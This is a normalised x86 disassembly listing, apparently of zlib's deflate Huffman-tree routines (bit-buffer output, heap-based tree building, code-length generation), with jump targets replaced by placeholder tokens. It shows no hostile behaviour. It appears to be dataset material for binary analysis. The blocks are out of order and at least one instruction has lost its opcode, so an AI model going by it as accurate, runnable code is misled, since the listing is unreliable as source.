mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ edi + esi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
pop edi
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16b4 ] esi
pop esi
pop ebx
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x1
push ecx
push edx
push eax
call sub_4090c0
add esp 0x10
retn
sub_407760
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov eax 0x2
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov edx [ esi + 0x14 ]
shl eax cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] ax
mov al [ esi + 0x16b0 ]
mov [ ecx + edx ] al
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x16b1 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov cx 0x10
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x16b4 ]
sub cx ax
mov edx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16b4 ] eax
mov [ esi + 0x16b0 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx edx
mov [ esi + 0x16b4 ] ecx
and eax 0xffff
mov edi eax
shl edi cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] di
mov edi [ esi + 0x14 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b1 ]
inc edi
mov [ esi + 0x14 ] edi
mov [ ebx + edi ] cl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx di
lea edx [ edi + edx - 0x10 ]
shr ax cl
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
xor edx edx
mov dx [ r--data ]
mov eax 0x10
sub eax edx
cmp ecx eax
mov eax [ r--data ]
jle r-xdata
mov [ esi + 0x16ac ] 0x7
pop edi
pop esi
pop ebx
retn
cmp ecx 0xd
mov eax 0x2
jle r-xdata
push esi
call sub_408fb0
mov ecx [ esi + 0x16b4 ]
mov edx [ esi + 0x16ac ]
sub edx ecx
add esp 0x4
add edx 0xb
cmp edx 0x9
jge r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov edx [ esi + 0x14 ]
shl eax cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] ax
mov al [ esi + 0x16b0 ]
mov [ ecx + edx ] al
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x16b1 ]
mov [ edx + eax ] cl
mov eax [ esi + 0x14 ]
inc eax
mov cx 0x10
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x16b4 ]
sub cx ax
mov edx 0x2
shr dx cl
add eax 0xfffffff3
mov [ esi + 0x16b4 ] eax
mov [ esi + 0x16b0 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx edx
mov [ esi + 0x16b4 ] ecx
and eax 0xffff
mov edi eax
shl edi cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] di
mov edi [ esi + 0x14 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
xor ecx ecx
mov cl [ esi + 0x16b1 ]
inc edi
mov [ esi + 0x14 ] edi
mov [ ebx + edi ] cl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx di
lea edx [ edi + edx - 0x10 ]
shr ax cl
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
xor edx edx
mov dx [ r--data ]
mov eax 0x10
sub eax edx
cmp ecx eax
mov eax [ r--data ]
jle r-xdata
push esi
call sub_408fb0
add esp 0x4
sub_4079c0
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x10 ]
xor eax eax
push edi
mov ecx [ esi + 0x7c ]
test ecx ecx
jle r-xdata
lea ecx [ ebp + 0x5 ]
cmp [ esi + 0x1c ] 0x2
jne r-xdata
cmp ecx edx
mov ecx [ esi + 0x16b4 ]
jne r-xdata
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
lea eax [ esi + 0xb10 ]
push eax
push esi
call sub_407bb0
lea ecx [ esi + 0xb1c ]
push ecx
push esi
call sub_407bb0
push esi
call sub_408180
mov edx [ esi + 0x16a0 ]
mov ecx [ esi + 0x16a4 ]
add edx 0xa
add ecx 0xa
shr edx 0x3
shr ecx 0x3
add esp 0x14
cmp ecx edx
ja r-xdata
push esi
call sub_408f10
add esp 0x4
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea edx [ edi + 0x4 ]
jle r-xdata
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea eax [ edi + 0x2 ]
jle r-xdata
mov edi [ esp + 0x20 ]
push edi
push ebp
push ebx
push esi
call sub_4076c0
add esp 0x10
jmp r-xdata
lea edi [ ebp + 0x4 ]
cmp edi edx
ja r-xdata
jmp r-xdata
shl edx cl
or [ esi + 0x16b0 ] dx
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov ebx edx
mov ebp [ esi + 0x8 ]
shl ebx cl
or [ esi + 0x16b0 ] bx
mov ebx [ esi + 0x14 ]
mov cl [ esi + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ esi + 0x14 ]
mov ebp [ esi + 0x8 ]
inc ebx
mov [ esi + 0x14 ] ebx
mov ecx ebx
xor ebx ebx
mov bl [ esi + 0x16b1 ]
mov [ ecx + ebp ] bl
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
add ebx 0xfffffff3
mov [ esi + 0x16b4 ] ebx
mov [ esi + 0x16b0 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x14 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ebx + ecx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
push esi
call sub_407650
add esp 0x4
test edi edi
je r-xdata
mov edx ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push esi
call sub_409040
add esp 0x4
mov ecx [ esi + 0xb14 ]
inc eax
push eax
mov eax [ esi + 0xb20 ]
inc eax
inc ecx
push eax
push ecx
push esi
call sub_4082e0
lea edx [ esi + 0x980 ]
lea eax [ esi + 0x8c ]
push edx
push eax
push esi
call sub_408ad0
add esp 0x1c
push r--data
push r--data
push esi
call sub_408ad0
add esp 0xc
jmp r-xdata
sub_407bb0
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ eax ]
mov eax [ eax + 0x8 ]
or ebp 0xffffffff
mov ebx [ eax ]
mov ecx [ eax + 0xc ]
xor eax eax
mov [ esp + 0x14 ] ecx
cmp ecx eax
mov [ esp + 0x10 ] ebp
mov [ esi + 0x1448 ] eax
mov [ esi + 0x144c ] 0x23d
jle r-xdata
mov ecx [ esi + 0x1448 ]
cmp ecx 0x2
jge r-xdata
mov edx edi
mov edx [ esp + 0x20 ]
mov [ edx + 0x4 ] ebp
mov eax [ esi + 0x1448 ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
cmp ebx 0x1
jl r-xdata
cmp ebp 0x2
jge r-xdata
mov [ edx + 0x2 ] 0x0
mov ecx [ esi + 0x1448 ]
mov [ esp + 0x10 ] eax
inc ecx
mov ebp eax
mov [ esi + 0x1448 ] ecx
mov [ esi + ecx * 4 + 0xb54 ] eax
mov [ eax + esi + 0x1450 ] 0x0
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ edi + eax * 4 ]
mov [ esp + 0x1c ] eax
push ebx
push edi
push esi
call sub_407df0
add esp 0xc
dec ebx
cmp ebx 0x1
jge r-xdata
xor eax eax
inc ebp
mov eax ebp
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
and ecx 0xff
mov eax ecx
and eax 0xff
jmp r-xdata
mov ecx [ esi + 0x1448 ]
cmp ecx 0x2
jl r-xdata
xor ecx ecx
mov cx [ ebx + eax * 4 + 0x2 ]
mov eax [ esi + 0x16a4 ]
sub eax ecx
mov [ esi + 0x16a4 ] eax
inc ecx
mov [ esi + 0x1448 ] ecx
mov [ esi + ecx * 4 + 0xb54 ] eax
mov [ edi + eax * 4 ] 0x1
mov [ esi + eax + 0x1450 ] 0x0
mov edx [ esi + 0x16a0 ]
dec edx
test ebx ebx
mov [ esi + 0x16a0 ] edx
je r-xdata
mov eax [ esi + 0x1448 ]
mov ebx [ esi + 0xb58 ]
push 0x1
push edi
mov ecx [ esi + eax * 4 + 0xb54 ]
dec eax
push esi
mov [ esi + 0xb58 ] ecx
mov [ esi + 0x1448 ] eax
call sub_407df0
mov edx [ esi + 0x144c ]
mov ebp [ esi + 0xb58 ]
add esp 0xc
dec edx
mov eax edx
mov [ esi + 0x144c ] edx
mov [ esi + eax * 4 + 0xb54 ] ebx
mov ecx [ esi + 0x144c ]
dec ecx
mov eax ecx
mov [ esi + 0x144c ] ecx
mov [ esi + eax * 4 + 0xb54 ] ebp
mov dx [ edi + ebp * 4 ]
add dx [ edi + ebx * 4 ]
mov eax [ esp + 0x1c ]
mov [ eax ] dx
mov al [ esi + ebx + 0x1450 ]
mov cl [ esi + ebp + 0x1450 ]
cmp al cl
jb r-xdata
mov edx [ esi + 0x144c ]
mov ecx [ esi + 0xb58 ]
dec edx
mov [ esi + 0x144c ] edx
mov eax edx
mov edx [ esp + 0x20 ]
push edx
push esi
mov [ esi + eax * 4 + 0xb54 ] ecx
call sub_407ed0
mov eax [ esp + 0x18 ]
add esi 0xb34
push esi
push eax
push edi
call sub_408100
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
inc al
push 0x1
push edi
mov [ esi + ecx + 0x1450 ] al
mov eax [ esp + 0x24 ]
mov [ edi + ebp * 4 + 0x2 ] cx
mov [ edi + ebx * 4 + 0x2 ] cx
mov [ esi + 0xb58 ] ecx
inc ecx
add eax 0x4
push esi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x28 ] eax
call sub_407df0
mov eax [ esi + 0x1448 ]
add esp 0xc
cmp eax 0x2
jge r-xdata
mov [ esp + 0x10 ] ebp
sub_407df0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
mov edx [ eax + 0x1448 ]
push edi
mov ebp [ eax + esi * 4 + 0xb54 ]
lea ecx [ esi + esi ]
cmp ecx edx
mov [ esp + 0x14 ] ebp
jg r-xdata
mov [ eax + esi * 4 + 0xb54 ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ esp + 0x18 ]
mov esi [ eax + ecx * 4 + 0xb54 ]
mov dx [ edi + ebp * 4 ]
mov bx [ edi + esi * 4 ]
cmp dx bx
jb r-xdata
mov esi [ eax + ecx * 4 + 0xb58 ]
mov ebp [ eax + ecx * 4 + 0xb54 ]
mov dx [ edi + esi * 4 ]
mov bx [ edi + ebp * 4 ]
cmp dx bx
jb r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + ecx * 4 + 0xb54 ] ebp
pop ebp
pop ebx
retn
jne r-xdata
inc ecx
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x1c ] ecx
shl ecx 0x1
mov [ eax + edx * 4 + 0xb54 ] esi
mov edx [ eax + 0x1448 ]
cmp ecx edx
jle r-xdata
mov dl [ eax + ebp + 0x1450 ]
mov bl [ esi + eax + 0x1450 ]
cmp dl bl
jbe r-xdata
mov ebp [ esp + 0x14 ]
mov dl [ esi + eax + 0x1450 ]
mov bl [ eax + ebp + 0x1450 ]
cmp dl bl
ja r-xdata
jge r-xdata
mov edx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + edx * 4 + 0xb54 ] ebp
pop ebp
pop ebx
retn
sub_407ed0
sub esp 0x1c
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov ebx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ esp + 0x18 ] ecx
push edi
xor esi esi
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov ebp [ eax + 0x10 ]
mov [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x30 ]
mov ecx 0x8
xor eax eax
lea edi [ edx + 0xb34 ]
mov [ esp + 0x10 ] esi
[ edi ]
mov eax [ edx + 0x144c ]
mov [ esp + 0x28 ] ebp
mov ecx [ edx + eax * 4 + 0xb54 ]
mov [ ebx + ecx * 4 + 0x2 ] si
mov esi [ edx + 0x144c ]
inc esi
cmp esi 0x23d
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
lea eax [ edx + esi * 4 + 0xb54 ]
mov [ esp + 0x30 ] eax
mov eax 0x23d
sub eax esi
add esi eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x34 ] esi
mov edi [ esp + 0x1c ]
mov [ ebx + ecx * 4 + 0x2 ] ax
cmp ecx edi
jg r-xdata
mov edi [ esp + 0x10 ]
mov eax ebp
inc edi
mov [ esp + 0x10 ] edi
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x18 ]
add ecx 0x4
dec eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x18 ] eax
jne r-xdata
mov esi [ esp + 0x20 ]
inc [ edx + eax * 2 + 0xb34 ]
xor edi edi
cmp ecx esi
jl r-xdata
mov ecx [ esp + 0x30 ]
xor eax eax
xor edi edi
mov ecx [ ecx ]
mov ax [ ebx + ecx * 4 + 0x2 ]
mov di [ ebx + eax * 4 + 0x2 ]
mov eax edi
inc eax
cmp eax ebp
jle r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov si [ ebx + ecx * 4 ]
add eax edi
and esi 0xffff
imul eax esi
add [ edx + 0x16a0 ] eax
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edi ecx
sub edi esi
mov esi [ esp + 0x24 ]
mov edi [ esi + edi * 4 ]
lea eax [ ebp - 0x1 ]
cmp [ edx + eax * 2 + 0xb34 ] 0x0
lea ecx [ edx + eax * 2 + 0xb34 ]
jne r-xdata
mov esi [ esp + 0x34 ]
mov ebp [ esp + 0x14 ]
xor eax eax
mov ax [ ebp + ecx * 4 + 0x2 ]
mov ecx [ edx + 0x16a4 ]
add eax edi
mov ebp [ esp + 0x28 ]
imul eax esi
add ecx eax
mov [ edx + 0x16a4 ] ecx
dec [ edx + eax * 2 + 0xb34 ]
add [ edx + eax * 2 + 0xb36 ] 0x2
dec [ edx + ebp * 2 + 0xb34 ]
sub edi 0x2
test edi edi
jg r-xdata
sub ecx 0x2
dec eax
cmp [ ecx ] 0x0
je r-xdata
test ebp ebp
mov edi ebp
je r-xdata
lea ebp [ edx + ebp * 2 + 0xb34 ]
mov [ esp + 0x18 ] ebp
mov ebp [ esp + 0x18 ]
dec edi
sub ebp 0x2
test edi edi
mov [ esp + 0x18 ] ebp
jne r-xdata
lea ebp [ edx + esi * 4 + 0xb54 ]
xor eax eax
mov ax [ ebp ]
test eax eax
mov [ esp + 0x30 ] eax
je r-xdata
test eax eax
jne r-xdata
lea esi [ ebx + ecx * 4 + 0x2 ]
xor eax eax
mov ax [ esi ]
cmp eax edi
je r-xdata
mov esi [ esp + 0x34 ]
mov ecx [ ebp - 0x4 ]
dec esi
sub ebp 0x4
mov [ esp + 0x34 ] esi
mov esi [ esp + 0x1c ]
cmp ecx esi
mov [ esp + 0x28 ] ebp
jg r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
dec eax
mov [ esp + 0x30 ] eax
mov ebp edi
sub ebp eax
xor eax eax
mov ax [ ebx + ecx * 4 ]
imul ebp eax
mov eax [ edx + 0x16a0 ]
add eax ebp
mov ebp [ esp + 0x28 ]
mov [ edx + 0x16a0 ] eax
mov [ esi ] di
sub_408100
mov edx [ esp + 0xc ]
sub esp 0x20
xor eax eax
lea ecx [ esp + 0x2 ]
push esi
lea esi [ esp + 0x6 ]
sub edx esi
push edi
mov esi 0xf
mov di [ edx + ecx ]
add ecx 0x2
add di ax
shl edi 0x1
mov eax edi
dec esi
mov [ ecx - 0x2 ] ax
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jl r-xdata
pop edi
pop esi
add esp 0x20
retn
mov esi [ esp + 0x2c ]
lea edi [ eax + 0x1 ]
add esi 0x4
dec edi
jne r-xdata
mov dx [ esp + ecx * 2 + 0x8 ]
push ecx
mov eax edx
and eax 0xffff
inc edx
push eax
mov [ esp + ecx * 2 + 0x10 ] dx
call sub_408f90
add esp 0x8
mov [ esi ] ax
xor ecx ecx
mov cx [ esi + 0x2 ]
test ecx ecx
je r-xdata
sub_408180
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xb14 ]
lea ecx [ esi + 0x8c ]
push eax
push ecx
push esi
call sub_4081f0
mov edx [ esi + 0xb20 ]
lea eax [ esi + 0x980 ]
push edx
push eax
push esi
call sub_4081f0
lea ecx [ esi + 0xb28 ]
push ecx
push esi
call sub_407bb0
add esp 0x20
mov eax 0x12
mov edx [ esi + 0x16a0 ]
lea ecx [ eax + eax * 2 + 0x11 ]
add edx ecx
mov [ esi + 0x16a0 ] edx
pop esi
retn
dec eax
cmp eax 0x3
jge r-xdata
xor edx edx
mov dl [ eax + r--data ]
cmp [ esi + edx * 4 + 0xa76 ] 0x0
jne r-xdata
sub_4081f0
push ecx
mov eax [ esp + 0xc ]
push ebx
xor ecx ecx
push esi
mov cx [ eax + 0x2 ]
push edi
xor edi edi
mov [ esp + 0xc ] 0xffffffff
test ecx ecx
mov edx 0x7
mov esi 0x4
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
mov [ eax + ebx * 4 + 0x6 ] 0xffff
jl r-xdata
mov edx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
pop ecx
retn
inc ebx
push ebp
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
lea ebp [ eax + 0x6 ]
cmp edi esi
jge r-xdata
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
add [ ebx + eax * 4 + 0xa74 ] di
jmp r-xdata
mov eax [ esp + 0x1c ]
add ebp 0x4
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
cmp edi 0xa
jg r-xdata
cmp eax [ esp + 0x10 ]
je r-xdata
xor edi edi
mov [ esp + 0x10 ] eax
test ecx ecx
jne r-xdata
mov eax ecx
xor ecx ecx
mov cx [ ebp ]
inc edi
cmp edi edx
jge r-xdata
pop ebp
inc [ ebx + 0xabc ]
inc [ ebx + 0xab8 ]
jmp r-xdata
inc [ ebx + 0xab4 ]
jmp r-xdata
inc [ ebx + eax * 4 + 0xa74 ]
cmp eax ecx
jne r-xdata
mov edx 0x8a
mov esi 0x3
jmp r-xdata
mov edx 0x7
mov esi 0x4
mov edx 0x6
mov esi 0x3
jmp r-xdata
sub_4082e0
push ebx
push ebp
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xb
jle r-xdata
add eax 0xfffffeff
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x5
mov [ esi + 0x16b4 ] ecx
add eax 0xfffffeff
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b1 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16b4 ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov eax [ esp + 0x1c ]
dec eax
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x5
mov [ esi + 0x16b4 ] ecx
mov edx [ esp + 0x1c ]
lea eax [ edx - 0x1 ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b1 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16b4 ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xb
jle r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x4
mov [ esi + 0x16b4 ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff4
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
mov ebp [ esp + 0x20 ]
cmp ecx 0xc
lea eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ esi + 0x8c ]
dec eax
push eax
push ecx
push esi
call sub_408550
mov edx [ esp + 0x28 ]
lea eax [ esi + 0x980 ]
dec edx
push edx
push eax
push esi
call sub_408550
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
xor edi edi
test ebp ebp
jle r-xdata
xor eax eax
mov al [ edi + r--data ]
mov dx [ esi + eax * 4 + 0xa76 ]
shl dx cl
or [ esi + 0x16b0 ] dx
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
xor edx edx
xor eax eax
mov dl [ edi + r--data ]
mov ax [ esi + edx * 4 + 0xa76 ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ecx + ebx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
inc edi
cmp edi ebp
jl r-xdata
sub_408550
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
xor ebx ebx
xor edx edx
mov bx [ eax + 0x2 ]
push esi
test ebx ebx
push edi
mov [ esp + 0xc ] 0xffffffff
mov ecx 0x7
mov esi 0x4
jne r-xdata
mov edi [ esp + 0x20 ]
test edi edi
jl r-xdata
mov ecx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
add esp 0x8
retn
add eax 0x6
inc edi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x18 ]
push ebp
mov [ esp + 0x14 ] edi
cmp edx esi
jge r-xdata
cmp ebp ebx
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa76 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ebp [ esp + 0x24 ]
mov edi [ esp + 0x14 ]
add ebp 0x4
dec edi
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] edi
jne r-xdata
cmp edx 0xa
jg r-xdata
cmp ebp [ esp + 0x10 ]
je r-xdata
mov di [ eax + ebp * 4 + 0xa74 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa74 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov edi [ esp + 0x24 ]
mov ebp ebx
xor ebx ebx
inc edx
mov bx [ edi ]
cmp edx ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] edx
jge r-xdata
pop ebp
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xabe ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xaba ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xab6 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa76 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
jmp r-xdata
dec edx
mov [ esp + 0x20 ] edx
jne r-xdata
mov di [ eax + 0xabc ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xabc ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xab8 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xab8 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
